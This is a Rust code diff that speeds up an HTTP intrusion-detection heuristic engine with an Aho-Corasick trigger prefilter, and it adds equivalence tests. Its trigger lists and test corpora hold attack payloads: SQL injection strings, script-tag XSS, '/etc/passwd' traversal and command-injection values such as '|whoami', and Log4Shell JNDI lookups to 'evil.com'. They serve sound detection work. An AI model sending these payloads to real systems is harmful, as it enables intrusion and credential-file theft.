@@ -3,9 +3,16 @@
 //! Each heuristic implements [`Heuristic`] and returns zero or more [`Signal`]s
 //! for an event. Heuristics are fast (microseconds) and run on every event
 //! that passes the rules engine. They never do network I/O.
+//!
+//! Performance (F5): a single Aho-Corasick automaton over literal trigger
+//! tokens gates the regexes — a family's regex can only match if one of its
+//! literals is present in the scanned text, so on clean traffic the engine
+//! runs one SIMD-vectorized scan and skips all eight text regexes. The
+//! URL-decoded path/query are computed once per event and shared.
 
 use std::sync::LazyLock;
 
+use aho_corasick::AhoCorasick;
 use regex::Regex;
 
 use crate::analysis::{Signal, SignalKind};
@@ -16,9 +23,196 @@ pub trait Heuristic: Send + Sync {
     /// Stable name for logging/metrics.
     fn name(&self) -> &'static str;
 
+    /// Prefilter gate bit (F5): the engine runs this detector only when the
+    /// automaton found one of the family's trigger literals. `None` = always
+    /// run (no text scan involved).
+    fn gate_bit(&self) -> Option<u8> {
+        None
+    }
+
     /// Analyze an event, returning signals it detected.
-    fn analyze(&self, evt: &Event) -> Vec<Signal>;
+    ///
+    /// `text` carries the URL-decoded path/query (empty for non-HTTP events),
+    /// computed once per event by the engine.
+    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal>;
 }
+
+/// URL-decoded path and query, shared by all text detectors (F5).
+#[derive(Default)]
+pub struct DecodedHttp {
+    /// Percent-decoded request path (`%27` → `'`, `+`/`%20` → space).
+    pub path: String,
+    /// Percent-decoded query string; empty when the event has no query.
+    pub query: String,
+}
+
+impl DecodedHttp {
+    fn of(http: &HttpData) -> Self {
+        let (path, query) = http_text(http);
+        Self { path, query }
+    }
+}
+
+/// Prefilter gate bits, one per text-scanning detector family.
+pub mod gate {
+    /// SQL injection family.
+    pub const SQLI: u8 = 1 << 0;
+    /// Cross-site scripting family.
+    pub const XSS: u8 = 1 << 1;
+    /// Path traversal family.
+    pub const TRAVERSAL: u8 = 1 << 2;
+    /// Local file inclusion family.
+    pub const LFI: u8 = 1 << 3;
+    /// Log4Shell JNDI lookup family.
+    pub const LOG4SHELL: u8 = 1 << 4;
+    /// Command injection family.
+    pub const CMD: u8 = 1 << 5;
+    /// Sensitive/administrative path family.
+    pub const SENSITIVE: u8 = 1 << 6;
+    /// Bad crawler User-Agent family.
+    pub const CRAWLER: u8 = 1 << 7;
+}
+
+/// Literal triggers per family: every regex alternative contains at least one
+/// of its family's literals (case-insensitive), so a family whose triggers
+/// are absent from all scanned fields cannot match. Keep in sync with the
+/// `*_RE` regexes below — `coverage` proptests enforce the invariant.
+struct FamilyPrefilter {
+    ac: AhoCorasick,
+    /// Gate bit per automaton pattern, parallel to the pattern list.
+    bits: Vec<u8>,
+}
+
+impl FamilyPrefilter {
+    fn build() -> Self {
+        const P: &[(&str, u8)] = &[
+            // sqli — branch 1 needs a quote; the others their keyword.
+            ("'", gate::SQLI),
+            ("union", gate::SQLI),
+            ("drop", gate::SQLI),
+            ("'1'", gate::SQLI),
+            ("1=1", gate::SQLI),
+            ("information_schema", gate::SQLI),
+            ("benchmark(", gate::SQLI),
+            // xss — one literal per regex alternative.
+            ("<script", gate::XSS),
+            ("javascript:", gate::XSS),
+            ("onerror", gate::XSS),
+            ("onload", gate::XSS),
+            ("onclick", gate::XSS),
+            ("onmouseover", gate::XSS),
+            ("<img", gate::XSS),
+            ("<iframe", gate::XSS),
+            ("<svg", gate::XSS),
+            ("alert(", gate::XSS),
+            ("document.cookie", gate::XSS),
+            ("eval(", gate::XSS),
+            // path traversal (decoded form).
+            ("../", gate::TRAVERSAL),
+            ("..\\", gate::TRAVERSAL),
+            ("..%2f", gate::TRAVERSAL),
+            ("..%5c", gate::TRAVERSAL),
+            ("%2e%2e", gate::TRAVERSAL),
+            ("..;/", gate::TRAVERSAL),
+            ("..;\\", gate::TRAVERSAL),
+            ("/etc/passwd", gate::TRAVERSAL),
+            ("/proc/self", gate::TRAVERSAL),
+            // lfi.
+            ("/etc/", gate::LFI),
+            ("/proc/self/", gate::LFI),
+            ("/var/log/", gate::LFI),
+            ("/boot/grub", gate::LFI),
+            ("/windows/system32", gate::LFI),
+            ("/win.ini", gate::LFI),
+            ("c:\\windows", gate::LFI),
+            ("file://", gate::LFI),
+            ("php://", gate::LFI),
+            ("expect://", gate::LFI),
+            ("data://", gate::LFI),
+            // log4shell.
+            ("${jndi:", gate::LOG4SHELL),
+            // command injection — one trigger per shell metachar branch.
+            (";", gate::CMD),
+            ("|", gate::CMD),
+            ("`", gate::CMD),
+            ("$(", gate::CMD),
+            ("&&", gate::CMD),
+            // sensitive path.
+            ("/.", gate::SENSITIVE),
+            ("wp-admin", gate::SENSITIVE),
+            ("wp-login", gate::SENSITIVE),
+            ("phpmyadmin", gate::SENSITIVE),
+            ("pma", gate::SENSITIVE),
+            ("adminer", gate::SENSITIVE),
+            ("wp-content", gate::SENSITIVE),
+            ("server-status", gate::SENSITIVE),
+            ("server-info", gate::SENSITIVE),
+            ("nginx-status", gate::SENSITIVE),
+            ("fpm-status", gate::SENSITIVE),
+            ("actuator", gate::SENSITIVE),
+            (".sql", gate::SENSITIVE),
+            (".bak", gate::SENSITIVE),
+            (".backup", gate::SENSITIVE),
+            (".old", gate::SENSITIVE),
+            (".swp", gate::SENSITIVE),
+            (".orig", gate::SENSITIVE),
+            (".save", gate::SENSITIVE),
+            ("/manager/html", gate::SENSITIVE),
+            // bad crawler (regex is a pure literal alternation).
+            ("sqlmap", gate::CRAWLER),
+            ("nikto", gate::CRAWLER),
+            ("nmap", gate::CRAWLER),
+            ("masscan", gate::CRAWLER),
+            ("zgrab", gate::CRAWLER),
+            ("nessus", gate::CRAWLER),
+            ("acunetix", gate::CRAWLER),
+            ("dirbuster", gate::CRAWLER),
+            ("gobuster", gate::CRAWLER),
+            ("wpscan", gate::CRAWLER),
+            ("hydra", gate::CRAWLER),
+            ("metasploit", gate::CRAWLER),
+            ("burp", gate::CRAWLER),
+            ("httrack", gate::CRAWLER),
+            ("libwww", gate::CRAWLER),
+            ("python-requests", gate::CRAWLER),
+            ("curl/", gate::CRAWLER),
+            ("go-http-client", gate::CRAWLER),
+            ("scrapy", gate::CRAWLER),
+            ("crawler4j", gate::CRAWLER),
+            ("semrush", gate::CRAWLER),
+            ("ahrefs", gate::CRAWLER),
+        ];
+        let ac = aho_corasick::AhoCorasickBuilder::new()
+            .ascii_case_insensitive(true)
+            .build(P.iter().map(|(p, _)| *p))
+            .expect("static patterns compile");
+        Self {
+            ac,
+            bits: P.iter().map(|(_, b)| *b).collect(),
+        }
+    }
+
+    /// Scan one text field, setting bits for families whose triggers appear.
+    ///
+    /// Overlapping iteration matters: triggers from different families can
+    /// overlap (`/.` vs `../` in `/../etc`), and non-overlapping semantics
+    /// would let the first-reported trigger starve the other families' bits.
+    fn scan_into(&self, text: &str, mask: &mut u8) {
+        for m in self.ac.find_overlapping_iter(text) {
+            *mask |= self.bits[m.pattern().as_usize()];
+        }
+    }
+
+    /// Whether any of a family's triggers appear in `text`.
+    #[cfg(test)]
+    fn family_hit(&self, bit: u8, text: &str) -> bool {
+        self.ac
+            .find_overlapping_iter(text)
+            .any(|m| self.bits[m.pattern().as_usize()] & bit != 0)
+    }
+}
+
+static PREFILTER: LazyLock<FamilyPrefilter> = LazyLock::new(FamilyPrefilter::build);
 
 /// Composite heuristic that runs all registered detectors.
 pub struct HeuristicEngine {
@@ -45,8 +239,52 @@ impl HeuristicEngine {
     }
 
     /// Run all detectors and collect signals.
+    ///
+    /// Text families are gated by the shared Aho-Corasick prefilter: on a
+    /// clean request none of their trigger literals appear and no regex runs.
     pub fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        self.detectors.iter().flat_map(|h| h.analyze(evt)).collect()
+        let decoded = evt.http().map(DecodedHttp::of);
+        let mut gates = 0u8;
+        if let (Some(http), Some(text)) = (evt.http(), decoded.as_ref()) {
+            PREFILTER.scan_into(&text.path, &mut gates);
+            PREFILTER.scan_into(&text.query, &mut gates);
+            if let Some(ua) = &http.user_agent {
+                PREFILTER.scan_into(ua, &mut gates);
+            }
+            if let Some(referer) = &http.referer {
+                PREFILTER.scan_into(referer, &mut gates);
+            }
+            for v in http.headers.values() {
+                PREFILTER.scan_into(v, &mut gates);
+            }
+        }
+        let empty = DecodedHttp::default();
+        let text = decoded.as_ref().unwrap_or(&empty);
+        let mut out = Vec::new();
+        for d in &self.detectors {
+            if let Some(bit) = d.gate_bit() {
+                if gates & bit == 0 {
+                    continue;
+                }
+            }
+            out.extend(d.analyze(evt, text));
+        }
+        out
+    }
+
+    /// Run every detector unconditionally (no prefilter gating).
+    ///
+    /// Test-only: the equivalence tests assert that gating never changes
+    /// the signal set.
+    #[cfg(test)]
+    fn analyze_ungated(&self, evt: &Event) -> Vec<Signal> {
+        let decoded = evt.http().map(DecodedHttp::of);
+        let empty = DecodedHttp::default();
+        let text = decoded.as_ref().unwrap_or(&empty);
+        self.detectors
+            .iter()
+            .flat_map(|d| d.analyze(evt, text))
+            .collect()
     }
 }
 
@@ -146,13 +384,11 @@ impl Heuristic for SqlInjection {
     fn name(&self) -> &'static str {
         "sqli"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        let http = match evt.http() {
-            Some(h) => h,
-            None => return vec![],
-        };
-        let (path, query) = http_text(http);
-        for t in [path.as_str(), query.as_str()] {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::SQLI)
+    }
+    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
+        for t in [text.path.as_str(), text.query.as_str()] {
             if SQLI_RE.is_match(t) {
                 return vec![Signal {
                     kind: SignalKind::SqlInjection,
@@ -171,13 +407,11 @@ impl Heuristic for Xss {
     fn name(&self) -> &'static str {
         "xss"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        let http = match evt.http() {
-            Some(h) => h,
-            None => return vec![],
-        };
-        let (path, query) = http_text(http);
-        for t in [path.as_str(), query.as_str()] {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::XSS)
+    }
+    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
+        for t in [text.path.as_str(), text.query.as_str()] {
             if XSS_RE.is_match(t) {
                 return vec![Signal {
                     kind: SignalKind::Xss,
@@ -196,17 +430,16 @@ impl Heuristic for PathTraversal {
     fn name(&self) -> &'static str {
         "path_traversal"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        let http = match evt.http() {
-            Some(h) => h,
-            None => return vec![],
-        };
-        let (path, query) = http_text(http);
-        if PATH_TRAVERSAL_RE.is_match(&path) || PATH_TRAVERSAL_RE.is_match(&query) {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::TRAVERSAL)
+    }
+    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
+        if PATH_TRAVERSAL_RE.is_match(&text.path) || PATH_TRAVERSAL_RE.is_match(&text.query) {
+            let path = evt.http().map(|h| h.path.clone()).unwrap_or_default();
             return vec![Signal {
                 kind: SignalKind::PathTraversal,
                 weight: 40,
-                detail: Some(http.path.clone()),
+                detail: Some(path),
             }];
         }
         vec![]
@@ -219,13 +452,11 @@ impl Heuristic for Lfi {
     fn name(&self) -> &'static str {
         "lfi"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        let http = match evt.http() {
-            Some(h) => h,
-            None => return vec![],
-        };
-        let (path, query) = http_text(http);
-        for t in [path.as_str(), query.as_str()] {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::LFI)
+    }
+    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
+        for t in [text.path.as_str(), text.query.as_str()] {
             if LFI_RE.is_match(t) {
                 return vec![Signal {
                     kind: SignalKind::Lfi,
@@ -244,15 +475,17 @@ impl Heuristic for Log4Shell {
     fn name(&self) -> &'static str {
         "log4shell"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::LOG4SHELL)
+    }
+    fn analyze(&self, evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
         let http = match evt.http() {
             Some(h) => h,
             None => return vec![],
         };
-        let (path, query) = http_text(http);
         for t in [
-            path.as_str(),
-            query.as_str(),
+            text.path.as_str(),
+            text.query.as_str(),
             http.user_agent.as_deref().unwrap_or(""),
             http.referer.as_deref().unwrap_or(""),
         ] {
@@ -283,13 +516,11 @@ impl Heuristic for CmdInjection {
     fn name(&self) -> &'static str {
         "cmd_injection"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
-        let http = match evt.http() {
-            Some(h) => h,
-            None => return vec![],
-        };
-        let (path, query) = http_text(http);
-        for t in [path.as_str(), query.as_str()] {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::CMD)
+    }
+    fn analyze(&self, _evt: &Event, text: &DecodedHttp) -> Vec<Signal> {
+        for t in [text.path.as_str(), text.query.as_str()] {
             if CMD_INJECTION_RE.is_match(t) {
                 return vec![Signal {
                     kind: SignalKind::Rce,
@@ -308,7 +539,10 @@ impl Heuristic for SensitivePath {
     fn name(&self) -> &'static str {
         "sensitive_path"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::SENSITIVE)
+    }
+    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
         let http = match evt.http() {
             Some(h) => h,
             None => return vec![],
@@ -330,7 +564,10 @@ impl Heuristic for BadCrawler {
     fn name(&self) -> &'static str {
         "bad_crawler"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+    fn gate_bit(&self) -> Option<u8> {
+        Some(gate::CRAWLER)
+    }
+    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
         let http = match evt.http() {
             Some(h) => h,
             None => return vec![],
@@ -356,7 +593,7 @@ impl Heuristic for EmptyUserAgent {
     fn name(&self) -> &'static str {
         "empty_ua"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
         let http = match evt.http() {
             Some(h) => h,
             None => return vec![],
@@ -385,7 +622,7 @@ impl Heuristic for TcpScanner {
     fn name(&self) -> &'static str {
         "tcp_scanner"
     }
-    fn analyze(&self, evt: &Event) -> Vec<Signal> {
+    fn analyze(&self, evt: &Event, _text: &DecodedHttp) -> Vec<Signal> {
         let code = match evt.tcp().and_then(|t| t.fingerprint.as_deref()) {
             Some(c) => c,
             None => return vec![],
@@ -419,10 +656,14 @@ mod tests {
         )
     }
 
+    fn text_of(e: &Event) -> DecodedHttp {
+        e.http().map(DecodedHttp::of).unwrap_or_default()
+    }
+
     #[test]
     fn detects_sqli() {
         let e = http_evt("/login?user=admin'+OR+1=1--", None);
-        let signals = SqlInjection.analyze(&e);
+        let signals = SqlInjection.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
         assert_eq!(signals[0].kind, SignalKind::SqlInjection);
     }
@@ -430,7 +671,7 @@ mod tests {
     #[test]
     fn detects_xss() {
         let e = http_evt("/search?q=<script>alert(1)</script>", None);
-        let signals = Xss.analyze(&e);
+        let signals = Xss.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
         assert_eq!(signals[0].kind, SignalKind::Xss);
     }
@@ -438,14 +679,14 @@ mod tests {
     #[test]
     fn detects_path_traversal() {
         let e = http_evt("/../../../etc/passwd", None);
-        let signals = PathTraversal.analyze(&e);
+        let signals = PathTraversal.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
     #[test]
     fn detects_lfi() {
         let e = http_evt("/page?file=/etc/shadow", None);
-        let signals = Lfi.analyze(&e);
+        let signals = Lfi.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
         assert_eq!(signals[0].kind, SignalKind::Lfi);
     }
@@ -456,35 +697,35 @@ mod tests {
             "/?page=php://filter/convert.base64-encode/resource=index",
             None,
         );
-        let signals = Lfi.analyze(&e);
+        let signals = Lfi.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
     #[test]
     fn detects_log4shell() {
         let e = http_evt("/", Some("${jndi:ldap://evil.com/x}"));
-        let signals = Log4Shell.analyze(&e);
+        let signals = Log4Shell.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
     #[test]
     fn detects_sensitive_path() {
         let e = http_evt("/.env", None);
-        let signals = SensitivePath.analyze(&e);
+        let signals = SensitivePath.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
     #[test]
     fn detects_bad_crawler() {
         let e = http_evt("/", Some("sqlmap/1.0"));
-        let signals = BadCrawler.analyze(&e);
+        let signals = BadCrawler.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
     #[test]
     fn detects_empty_ua() {
         let e = http_evt("/", None);
-        let signals = EmptyUserAgent.analyze(&e);
+        let signals = EmptyUserAgent.analyze(&e, &text_of(&e));
         assert!(!signals.is_empty());
     }
 
@@ -526,11 +767,15 @@ mod proptests {
         )
     }
 
+    fn text_of(e: &Event) -> DecodedHttp {
+        e.http().map(DecodedHttp::of).unwrap_or_default()
+    }
+
     proptest! {
         #[test]
         fn proptest_sqli_union_select(payload in "(?i)union\\s+select") {
             let e = http_evt(&format!("/?id={payload}"), None);
-            let signals = SqlInjection.analyze(&e);
+            let signals = SqlInjection.analyze(&e, &text_of(&e));
             prop_assert!(!signals.is_empty());
         }
 
@@ -538,7 +783,7 @@ mod proptests {
         fn proptest_sqli_or_1_1(sep in r#"['"]"#) {
             let payload = format!("{sep} OR 1=1--");
             let e = http_evt(&format!("/?id={payload}"), None);
-            let signals = SqlInjection.analyze(&e);
+            let signals = SqlInjection.analyze(&e, &text_of(&e));
             prop_assert!(!signals.is_empty());
         }
 
@@ -546,7 +791,7 @@ mod proptests {
         fn proptest_xss_script_tag(inner in r#"[a-zA-Z0-9]{1,20}"#) {
             let payload = format!("/?q=<script>alert({inner})</script>");
             let e = http_evt(&payload, None);
-            let signals = Xss.analyze(&e);
+            let signals = Xss.analyze(&e, &text_of(&e));
             prop_assert!(!signals.is_empty());
         }
 
@@ -554,7 +799,7 @@ mod proptests {
         fn proptest_path_traversal_encoded(count in 1usize..=5) {
             let payload = "%2e%2e%2f".repeat(count);
             let e = http_evt(&format!("/{payload}"), None);
-            let signals = PathTraversal.analyze(&e);
+            let signals = PathTraversal.analyze(&e, &text_of(&e));
             prop_assert!(!signals.is_empty());
         }
 
@@ -562,7 +807,7 @@ mod proptests {
         fn proptest_log4shell_jndi(host in r#"[a-z]{1,10}\.com"#) {
             let payload = format!("${{jndi:ldap://{host}/x}}");
             let e = http_evt("/", Some(&payload));
-            let signals = Log4Shell.analyze(&e);
+            let signals = Log4Shell.analyze(&e, &text_of(&e));
             prop_assert!(!signals.is_empty());
         }
 
@@ -573,8 +818,136 @@ mod proptests {
         ) {
             let full = format!("{path}?{q}");
             let e = http_evt(&full, Some("Mozilla/5.0"));
-            let signals = SqlInjection.analyze(&e);
+            let signals = SqlInjection.analyze(&e, &text_of(&e));
             prop_assert!(signals.is_empty(), "false positive on {full}");
+        }
+    }
+
+    /// Gating must never change the signal set: for arbitrary request
+    /// strings, the gated engine returns exactly what the ungated one does.
+    #[test]
+    fn engine_gating_equivalence_corpus() {
+        let corpus = [
+            "/api/users?page=1",
+            "/",
+            "/login?user=admin'+OR+1=1--",
+            "/?id=1%20UNION%20SELECT%20password",
+            "/search?q=<script>alert(1)</script>",
+            "/?q=<img src=x onerror=alert(1)>",
+            "/?x=javascript:void(0)",
+            "/../../../etc/passwd",
+            "/%2e%2e%2f%2e%2e%2fboot.ini",
+            "/download?file=../../windows/system32/config",
+            "/?page=php://filter/convert.base64-encode/resource=index",
+            "/?f=file:///etc/shadow",
+            "/x.jsp?i=${jndi:ldap://evil.com/a}",
+            "/api?callback=${JNDI:rmi://x/y}",
+            "/cmd?exec=;cat%20/etc/passwd",
+            "/ping?host=1|whoami",
+            "/run?c=`id`",
+            "/api?x=$(uname%20-a)",
+            "/a?b=1&&ls",
+            "/.env",
+            "/.git/config",
+            "/wp-admin/setup.php",
+            "/phpmyadmin/index.php",
+            "/backup.sql",
+            "/site.old",
+            "/manager/html",
+            "/actuator/env",
+            "/server-status",
+            "/",
+            "/go_http_client",
+            "/x?ua=python-requests/2.0",
+            "/api/v2/health?check=ok&token=abc",
+            "/static/main.css?v=123",
+        ];
+        let engine = HeuristicEngine::with_defaults();
+        for path in corpus {
+            let e = http_evt(path, Some("Mozilla/5.0 (compatible)"));
+            let gated = engine.analyze(&e);
+            let ungated = engine.analyze_ungated(&e);
+            assert_eq!(
+                gated.len(),
+                ungated.len(),
+                "gating changed the signal count on {path}: {gated:?} vs {ungated:?}"
+            );
+            for (g, u) in gated.iter().zip(ungated.iter()) {
+                assert_eq!(g.kind, u.kind, "kind mismatch on {path}");
+                assert_eq!(g.weight, u.weight, "weight mismatch on {path}");
+            }
+        }
+    }
+
+    /// Prefilter soundness: if a family's regex matches a field, the
+    /// automaton must have found one of that family's triggers in it.
+    /// Guards the trigger tables against drift from the `*_RE` regexes.
+    #[test]
+    fn prefilter_triggers_are_necessary_literals() {
+        let samples = [
+            "",
+            "/",
+            "abc",
+            "' OR 1=1--",
+            "1 UNION SELECT * FROM users",
+            "x'; DROP TABLE users;--",
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "javascript:document.cookie",
+            "../../etc/passwd",
+            "..%2f..%2fproc/self/environ",
+            "%2e%2e%5cwin.ini",
+            "file:///c:\\windows\\system32",
+            "php://input",
+            "data://text/plain",
+            "expect://id",
+            "${jndi:ldap://x}",
+            "${JNDI:dns://y}",
+            ";cat /etc/passwd",
+            "|whoami",
+            "`uname`",
+            "$(id)",
+            "&&ls",
+            "/.env",
+            "/.aws/credentials",
+            "/wp-login.php",
+            "/pma/",
+            "/actuator/heapdump",
+            "/backup.old",
+            "/db.sql",
+            "/manager/html",
+            "/server-info",
+            "sqlmap/1.5",
+            "Nmap Scripting Engine",
+            "python-requests/2.31",
+            "go-http-client/2.0",
+            "Hydra v9",
+            "masscan/1.3",
+        ];
+        let pf = &*PREFILTER;
+        for t in samples {
+            let check = |bit: u8, hit: bool, family: &str| {
+                assert!(
+                    !hit || pf.family_hit(bit, t),
+                    "{family} regex matched {t:?} but no trigger literal was found"
+                );
+            };
+            check(gate::SQLI, SQLI_RE.is_match(t), "sqli");
+            check(gate::XSS, XSS_RE.is_match(t), "xss");
+            check(gate::TRAVERSAL, PATH_TRAVERSAL_RE.is_match(t), "traversal");
+            check(gate::LFI, LFI_RE.is_match(t), "lfi");
+            check(gate::LOG4SHELL, LOG4SHELL_RE.is_match(t), "log4shell");
+            check(gate::CMD, CMD_INJECTION_RE.is_match(t), "cmd");
+            check(
+                gate::SENSITIVE,
+                SENSITIVE_PATH_RE.is_match(&t.to_ascii_lowercase()),
+                "sensitive",
+            );
+            check(
+                gate::CRAWLER,
+                BAD_CRAWLER_RE.is_match(&t.to_ascii_lowercase()),
+                "crawler",
+            );
         }
     }
 }
